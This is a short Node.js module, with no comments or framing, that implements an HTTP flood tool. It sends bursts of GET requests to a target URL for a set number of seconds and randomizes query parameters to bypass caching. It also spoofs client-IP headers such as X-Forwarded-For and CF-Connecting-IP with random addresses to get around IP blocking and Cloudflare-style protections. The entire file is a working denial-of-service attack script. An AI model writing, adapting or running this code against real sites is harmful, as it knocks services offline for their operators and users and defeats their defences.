const http = require("http");
const https = require("https");
const { URL } = require("url");

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

module.exports = function (target, duration) {
  const base = new URL(target);
  const client = base.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function buildQuery() {
    const params = new Array(10).fill(0).map(() =>
      `param${Math.random().toString(36).substring(2)}=${Math.random().toString(36)}`
    ).join("&");
    return base.pathname + "?" + params;
  }

  function send() {
    const headers = {
      "User-Agent": "YourFloodBot/1.0",
      "X-Forwarded-For": fakeIP(),
      "Client-IP": fakeIP(),
      "CF-Connecting-IP": fakeIP(),
      "True-Client-IP": fakeIP()
    };

    const options = {
      method: "GET",
      hostname: base.hostname,
      path: buildQuery(),
      port: base.port || (base.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${base.hostname} using GET`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 20; i++) send();
    setImmediate(loop);
  }

  loop();
};
